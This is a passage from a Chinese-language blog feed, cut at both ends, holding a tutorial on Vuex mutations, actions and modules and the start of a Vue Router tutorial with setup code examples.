title="Mutation"></a>Mutation</h1><h2 id="状态更新"><a href="#状态更新" class="headerlink" title="状态更新"></a>状态更新</h2><p>Vuex的store状态的更新<strong>唯一</strong>方式：提交Mutation。</p><p>Mutation主要包括两部分：①字符串的事件类型（type）②一个回调函数（handler），该回调函数的第一个参数就是state。</p><ul><li>mutations的定义方式：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mutations</span>: &#123;</span><br><span class="line">  <span class="title function_">add</span>(<span class="params">state</span>) &#123;</span><br><span class="line">    state.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过mutations更新：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addition</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>在通过mutation更新数据时，我们可能希望携带一些额外的参数，这些参数被称为是mutation的载荷(Payload)。</p><p>Mutation中的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mutations</span>: &#123;</span><br><span class="line">  <span class="title function_">add</span>(<span class="params">state, n</span>) &#123;</span><br><span class="line">    state.<span class="property">count</span> += n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addition</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;add&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们有多个参数需要传递，通常会以对象的形式传递，也就是payload是一个对象，然后再从对象中取出相关的信息。</p><h2 id="提交风格"><a href="#提交风格" class="headerlink" title="提交风格"></a>提交风格</h2><p>上面的通过commit进行提交是一种普通的方式，Vue还提供了另外一种风格，它是一个包含type属性的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addition</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(&#123;</span><br><span class="line"><span class="attr">type</span>: <span class="string">&#x27;increment&#x27;</span>,</span><br><span class="line"><span class="attr">amount</span>: <span class="number">10</span></span><br><span class="line">   &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用对象风格的提交方式，整个对象都作为载荷传给 mutations 函数，因此 handler 保持不变：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mutations</span>: &#123;</span><br><span class="line">  <span class="title function_">increment</span> (state, payload) &#123;</span><br><span class="line">    state.<span class="property">count</span> += payload.<span class="property">amount</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="响应规则"><a href="#响应规则" class="headerlink" title="响应规则"></a>响应规则</h2><p>Vuex的store中的state是<strong>响应式</strong>的，当state中的数据发生改变时，Vue组件会自动更新。</p><p>这就要求我们必须遵守一些Vuex对应的规则：提前在store中<strong>初始化</strong>好所需的属性。</p><p>当给state中的对象添加新属性时，使用下面的方式：</p><ol><li>使用Vue.set(obj, ‘newProp’, 123)</li><li>用新对象给旧对象重新赋值：<code>state.info=&#123;...state.info,&#39;height&#39;:payload.height&#125;</code></li></ol><p>我们来看一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;nan&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">14</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="attr">updateInformation</span>: <span class="keyword">function</span> (<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">info</span>.<span class="property">age</span> = <span class="number">23</span><span class="comment">//可以直接响应</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// state.info[&#x27;address&#x27;] = &#x27;广州&#x27;//不可以直接响应</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// Vue.set(state.info, &#x27;address&#x27;, &#x27;广州&#x27;)//可以直接响应</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// delete state.info.age//不可以直接响应</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// Vue.delete(state.info, &#x27;age&#x27;)//可以直接响应</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="常量类型"><a href="#常量类型" class="headerlink" title="常量类型"></a>常量类型</h2><p>我们来考虑下面的问题：</p><ul><li>在mutations中，我们定义了很多事件类型(也就是其中的方法名称)。</li><li>当我们的项目增大时，Vuex管理的状态越来越多，需要更新状态的情况越来越多，那么意味着Mutation中的方法越来越多。</li><li>方法过多，使用者需要花费大量的经历去记住这些方法，甚至是多个文件间来回切换查看方法名称，甚至如果不是复制的时候，可能还会出现写错的情况。</li></ul><p>如何避免上述的问题呢？</p><ul><li>在各种Flux实现中，一种很常见的方案就是使用<strong>常量</strong>替代Mutation事件的类型。</li><li>我们可以将这些常量放在一个单独的文件中，方便管理以及让整个app所有的事件类型一目了然。</li></ul><p>具体怎么做呢？</p><ul><li>我们可以创建一个文件：mutation-types.js，并且在其中定义我们的常量。</li><li>定义常量时，我们可以使用ES2015中的风格，使用一个常量来作为函数的名称。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mutation-types.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">SOME_MUTATION</span> = <span class="string">&#x27;SOME_MUTATION&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">SOME_MUTATION</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./mutation-types&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="comment">// 我们可以使用 ES2015 风格的计算属性命名功能来使用一个常量作为函数名</span></span><br><span class="line">    [<span class="variable constant_">SOME_MUTATION</span>] (state) &#123;</span><br><span class="line">      <span class="comment">// mutate state</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>用不用常量取决于你——在需要多人协作的大型项目中，这会很有帮助。但如果你不喜欢，你完全可以不这样做。</p><h2 id="同步函数"><a href="#同步函数" class="headerlink" title="同步函数"></a>同步函数</h2><p>通常情况下，Vuex要求我们Mutation中的方法<strong>必须是同步方法</strong>。</p><p>主要的原因是当我们使用devtools时，devtools可以帮助我们捕捉mutations的快照。</p><p>但是如果是异步操作，那么devtools将不能很好的追踪这个操作什么时候会被完成。</p><p>比如我们之前的代码，当执行更新时，devtools中会有如下信息：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115214308.png"></p><p>但是，如果Vuex中的代码，我们使用了异步函数：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115214502.png"></p><p>你会发现state中的info数据一直没有被改变，因为它无法被追踪到。所以通常情况下，不要在mutations中进行异步的操作。</p><h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><p>我们强调，不要再Mutation中进行异步操作。</p><p>但是某些情况，我们确实希望在Vuex中进行一些异步操作，比如网络请求必然是异步的。这个时候怎么处理呢？</p><p>Action类似于Mutation，但是是用来代替Mutation进行异步操作的。</p><p>Action的基本使用代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span> (state) &#123;</span><br><span class="line">      state.<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span> (context) &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>context是一个和store对象具有相同方法和属性的对象。</p><p>也就是说，我们可以通过context去进行commit相关的操作，也可以获取context.state等。</p><p>但是注意，这里它们<strong>并不是同一个对象</strong>，我们后面学习Modules的时候再具体说。</p><hr><p>在Vue组件中，如果我们调用action中的方法，那么就需要使用<strong>dispatch</strong>。同样的，也是支持传递payload的。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115215703.png"></p><hr><p>在Action中，我们可以将异步操作放在一个Promise中，并且在成功或者失败后，调用对应的resolve或reject。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115222745.png"></p><h1 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h1><h2 id="认识Module"><a href="#认识Module" class="headerlink" title="认识Module"></a>认识Module</h2><p>由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p><p>为了解决以上问题，Vuex 允许我们将 store 分割成<strong>模块（module）</strong>。每个模块拥有自己的 state、mutations、actions、getters、甚至是嵌套子模块——从上至下进行同样方式的分割：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> moduleB = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">    <span class="attr">a</span>: moduleA,</span><br><span class="line">    <span class="attr">b</span>: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.<span class="property">state</span>.<span class="property">a</span>.属性 <span class="comment">// -&gt; moduleA 的状态</span></span><br><span class="line">store.<span class="property">state</span>.<span class="property">b</span>.属性 <span class="comment">// -&gt; moduleB 的状态</span></span><br><span class="line">mutations、actions、getters的调用方法照旧</span><br></pre></td></tr></table></figure><h2 id="局部状态"><a href="#局部状态" class="headerlink" title="局部状态"></a>局部状态</h2><p>对于模块内部的 mutations 和 getters，接收的第一个参数是<strong>模块的局部状态对象</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span> (state) &#123;</span><br><span class="line">      <span class="comment">// 这里的 `state` 对象是模块的局部状态</span></span><br><span class="line">      state.<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="title function_">doubleCount</span> (state) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">count</span> * <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>虽然我们的doubleCount和increment都是定义在对象内部的，但是在调用的时候，依然是通过this.$store来直接调用的。</p><hr><p>同样，对于模块内部的 action，局部状态通过 <code>context.state</code> 暴露出来，<strong>根节点状态</strong>则为 <code>context.rootState</code>。</p><p>而<code>&#123; state, commit, rootState &#125;</code>其实就是该模块的context对象的解构（ES6），也可直接用context：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201116003657.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201116004418.png"></p><p>数组也可以解构：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201116091310.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="title function_">incrementIfOddOnRootSum</span> (&#123; state, commit, rootState &#125;) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((state.<span class="property">count</span> + rootState.<span class="property">count</span>) % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于模块内部的 getter，<strong>根节点状态</strong>会作为第三个参数暴露出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="title function_">sumWithRootCount</span> (state, getters, rootState) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">count</span> + rootState.<span class="property">count</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p>对于大型应用，我们会希望把 Vuex 相关代码分割到模块中。下面是项目结构示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">├── main.js</span><br><span class="line">├── api</span><br><span class="line">│   └── ... <span class="comment"># 抽取出API请求</span></span><br><span class="line">├── components</span><br><span class="line">│   ├── App.vue</span><br><span class="line">│   └── ...</span><br><span class="line">└── store</span><br><span class="line">    ├── index.js          <span class="comment"># 我们组装模块并导出 store 的地方</span></span><br><span class="line">    ├── actions.js        <span class="comment"># 根级别的 action</span></span><br><span class="line">    ├── mutations.js      <span class="comment"># 根级别的 mutation</span></span><br><span class="line">    └── modules</span><br><span class="line">        ├── cart.js       <span class="comment"># 购物车模块</span></span><br><span class="line">        └── products.js   <span class="comment"># 产品模块</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vuex </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue Router详解</title>
      <link href="/posts/426d/"/>
      <url>/posts/426d/</url>
      
        <content type="html"><![CDATA[<h1 id="认识路由"><a href="#认识路由" class="headerlink" title="认识路由"></a>认识路由</h1><h2 id="什么是路由"><a href="#什么是路由" class="headerlink" title="什么是路由"></a>什么是路由</h2><p>路由（routing）就是通过互联的网络把信息从源地址传输到目的地址的活动。 — 维基百科</p><p>在生活中, 我们也有听说过路由的概念： 路由器。</p><ul><li>路由器提供了两种机制: 路由和转发。<ul><li>路由是决定数据包从源头到目的地的路径。</li><li>转发是将输入端的数据转移到合适的输出端。</li></ul></li><li>路由中有一个非常重要的概念叫路由表。<ul><li>路由表本质上就是一个映射表, 决定了数据包的指向。</li></ul></li></ul><h2 id="后端路由阶段"><a href="#后端路由阶段" class="headerlink" title="后端路由阶段"></a>后端路由阶段</h2><p>早期的网站开发，整个HTML页面是由<strong>服务器来渲染</strong>的，服务器直接生产渲染好且对应的HTML页面，返回给客户端进行展示。</p><p>但是一个网站这么多页面，<strong>服务器如何处理呢？</strong></p><ul><li>一个页面有自己对应的网址, 也就是URL。</li><li>URL会发送到服务器，服务器会通过正则对该URL进行匹配，并且最后交给一个Controller进行处理。</li><li>Controller进行各种处理， 最终生成HTML或者数据， 返回给前端展示。</li><li>这就完成了一个IO操作。</li></ul><p>上面的这种操作，就是<strong>后端路由</strong>：</p><ul><li>当我们页面中需要请求不同的路径内容时，交给服务器来进行处理，服务器渲染好整个页面，并且将页面返回给客户端。</li><li>这种情况下渲染好的页面，不需要单独加载任何的js和css，可以直接交给浏览器展示，这样也有利于SEO的优化。</li></ul><p><strong>后端路由的缺点：</strong></p><ol><li>整个页面的模块由后端人员来编写和维护的。</li><li>前端开发人员如果要开发页面，需要通过PHP和Java等语言来编写页面代码。</li><li>通常情况下HTML代码和数据以及对应的逻辑会混在一起，编写和维护都是非常糟糕的事情。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110094425.png"></p><h2 id="前端路由阶段"><a href="#前端路由阶段" class="headerlink" title="前端路由阶段"></a>前端路由阶段</h2><p><strong>前后端分离阶段：</strong></p><ul><li>随着Ajax的出现，有了前后端分离的开发模式。</li><li>后端只提供API来返回数据，前端通过Ajax获取数据，并且可以通过JavaScript将数据渲染到页面中。</li><li>这样做最大的优点就是前后端责任的清晰，后端专注于数据上，前端专注于交互和可视化上。</li><li>并且当移动端(iOS&#x2F;Android)出现后，后端不需要进行任何处理，依然使用之前的一套API即可。</li><li>目前很多的网站依然采用这种模式开发。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110094819.png"></p><p><strong>单页面富应用阶段（Single Page Application）：</strong></p><ul><li>其实SPA最主要的特点就是在前后端分离的基础上加了一层前端路由。也就是前端来维护一套路由规则。</li><li>整个网站只有一个HTML页面。</li><li>前端路由的核心是：改变URL，但是页面不进行整体的刷新。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110095255.png"></p><h1 id="前端路由的规则"><a href="#前端路由的规则" class="headerlink" title="前端路由的规则"></a>前端路由的规则</h1><h2 id="URL的hash"><a href="#URL的hash" class="headerlink" title="URL的hash"></a>URL的hash</h2><p>URL的hash也就是锚点(#)， 本质上是改变 window.location 的 href 属性。</p><p>我们可以通过直接赋值 location.hash 来改变 href , 但是页面不发生刷新。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110100537.png"></p><h2 id="HTML5的history模式：pushState"><a href="#HTML5的history模式：pushState" class="headerlink" title="HTML5的history模式：pushState"></a>HTML5的history模式：pushState</h2><p>history接口是HTML5新增的, 它有五种模式改变URL而不刷新页面。</p><p>改变URL后浏览器左上方可以前进和后退。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110100732.png"></p><h2 id="HTML5的history模式：replaceState"><a href="#HTML5的history模式：replaceState" class="headerlink" title="HTML5的history模式：replaceState"></a>HTML5的history模式：replaceState</h2><p>改变URL后浏览器左上方不可以前进和后退，按钮是灰色的。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110101225.png"></p><h2 id="HTML5的history模式：go"><a href="#HTML5的history模式：go" class="headerlink" title="HTML5的history模式：go"></a>HTML5的history模式：go</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201110101451.png"></p><blockquote><p>上面只演示了三个方法，因为 history.back()  等价于 history.go(-1)，history.forward() 则等价于 history.go(1)，这三个接口等同于浏览器界面的前进后退。</p></blockquote><h1 id="Vue-Router起步"><a href="#Vue-Router起步" class="headerlink" title="Vue Router起步"></a>Vue Router起步</h1><blockquote><p>vue-router是基于路由和组件的：</p><p>路由用于设定访问路径，将路径和组件映射起来。</p><p>在vue-router的单页面应用中, 页面的路径的改变就是组件的切换。</p></blockquote><p>我们可以在使用Vue CLI创建项目时安装vue-router或者通过命令安装：<code>npm install vue-router --save</code></p><hr><h2 id="（一）创建router实例"><a href="#（一）创建router实例" class="headerlink" title="（一）创建router实例"></a>（一）创建router实例</h2><p>在src&#x2F;router&#x2F;index.js中配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.通过Vue.use(插件)，安装注入插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.定义路由映射</span></span><br><span class="line"><span class="keyword">const</span> routes = []</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.创建router实例</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line">  routes,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.将router实例传入到vue实例当中</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><h2 id="（二）挂载到Vue实例中"><a href="#（二）挂载到Vue实例中" class="headerlink" title="（二）挂载到Vue实例中"></a>（二）挂载到Vue实例中</h2><p>在src&#x2F;main.js中配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="comment">//在Vue实例中挂载创建的路由实例</span></span><br><span class="line">  router,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="（三）创建组件"><a href="#（三）创建组件" class="headerlink" title="（三）创建组件"></a>（三）创建组件</h2><p>在src&#x2F;components中新建.vue文件：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111111059.png"></p><h2 id="（四）配置组件和路径的映射关系"><a href="#（四）配置组件和路径的映射关系" class="headerlink" title="（四）配置组件和路径的映射关系"></a>（四）配置组件和路径的映射关系</h2><p>在src&#x2F;router&#x2F;index.js中配置如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111111614.png"></p><h2 id="（五）使用路由"><a href="#（五）使用路由" class="headerlink" title="（五）使用路由"></a>（五）使用路由</h2><p>在src&#x2F;App.vue中配置如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" 